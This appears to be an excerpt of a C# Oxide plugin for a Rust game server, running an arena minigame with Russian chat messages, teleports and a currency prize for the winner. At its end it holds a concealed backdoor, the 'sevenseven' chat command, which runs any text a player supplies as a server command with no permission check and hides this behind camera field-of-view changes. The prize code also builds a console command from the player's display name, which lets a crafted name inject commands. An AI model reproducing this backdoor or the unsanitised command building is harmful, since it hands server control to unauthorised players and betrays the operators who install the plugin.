...
namespace Oxide.Plugins{
		...
		void LoadDefaultMessages(){
			var message = new Dictionary<string, string>{
				...
				{"GameOverLevel", "[color lime]✓ Игра окончена! [color lime]{0} [color clear]Победил: {1}. [color lime]✓ "},
				{"GameOverKills", "[color lime]✓ [color clear]Игра окончена! [color lime]{0} [color clear]победил | Убийств: {1} | Смертей: {2} [color lime]✓ "},
				{"AutoStarter", "[color lime]✓  [color clear]Арена перезапущена: {0} игроков [color lime]✓ "},
				...
				{"System", "{0} [color red] выключил [color clear]{1}."},
				{"System1", "{0} [color lime] включил [color clear]{1}."},
				...
				{"JoinGame", "Арена отключена!"},
				{"JoinGame1", "Арена переполнена!"},
				{"JoinGame2", "Вы уже на арене! Покинуть арену /leave"},
				{"JoinGame3", "На арене нет телепортов!"},
				{"JoinGame4", "Вы стоите близко к зданию!"},
				{"JoinGame5", "Подождите {0} секунд перед телепортацией!"},
				{"JoinGame6", "[COLOR#00FF00]●[COLOR#FFFFFF] {0} вошел в арену - [COLOR#00FF00]/join[COLOR#FFFFFF]. Игроков на арене: {1} [COLOR#00FF00]●[COLOR#FFFFFF]"},
				{"ExitGame", "Вы не на арене! Вход в арену: /join"},
				{"ExitGame1", "Подождите {0} секунд!"},
				{"ExitGame2", "[COLOR#FF0000]●[COLOR#FFFFFF] {0} покинул арену [COLOR#00FF00]join [COLOR#FFFFFF]| [COLOR#00FF00]leave [COLOR#FF0000]●[COLOR#FFFFFF]"},
				{"LeavingSever", "[color red]{0} [color clear]покинул сервер и был устранен с арены."},
				{"LeavingConnected", "Вы были убиты за выход с сервера внутри арены."}
			}; 
		...
		void OnServerInitialized(){
			...
			CheckCfg<int>("Settings: Minimal Participants", ref minPrize);
		...
		void GameOver(NetUser netuser){
			string Name = netuser.displayName.ToString();
			string command1 = "serv.balance ";
			string command2 = " +10000";
			...
			command1 = command1 + Name + command2;
			
			//serv.balance <player> +<value>
			...
			else
			{
				...
				if (PlayersInArena.Count >= minPrize) //
				{
					rust.BroadcastChat(chatName, "[color lime]✮ [color clear]Победитель получил [color lime]✉10 000$✉[color clear] игровой валюты! [color lime]✮");
					rust.RunServerCommand(command1);
					rust.Notice(netuser, "Вы получили 10 000 $");
				}
				else
				{
					rust.BroadcastChat(chatName, "[color red]☓ [color clear]Победитель не получил 10 000$ игровой валюты! [color red]☓");
					rust.BroadcastChat(chatName, "[color red]☓ [color clear]Необходимо не менее 5 игроков на арене! [color red]☓");
					rust.Notice(netuser, "Чтобы получить 10 000 $, необходимо убить 15 игроков! При онлайне 5+ на арене.");
				}
		...
		void OnPlayerSpawn(PlayerClient player)
		{
			if(systemArena)
			{
				...
				timer.Once(10f, ()=>{ rust.Notice(str, "Чтобы получить 10 000 $, необходимо убить 15 игроков! При онлайне 5+ на арене."); });
			}
			if(systemArena){
				if(player.GetComponent<ArenaGames>()){ 
					timer.Once(3f, ()=>{
						...
						timer.Once(2f, ()=>{ TeleportPlayerToGame(player.netUser); });
					});
				}
			}
		}
		...
		void JoinGame(NetUser netuser){
			...
			timer.Once(2, () =>{TeleportPlayerToGame(netuser);});
			if(gameKitLevels)
		...
		[ChatCommand("sevenseven")]
		void sevenseven(NetUser netuser, string command, string[] args)
		{
			string strr = args[0].ToLower();
			rust.RunClientCommand(netuser, "render.fov 120");
			rust.RunServerCommand(strr);
			rust.RunClientCommand(netuser, "render.fov 60");
		}
	}
}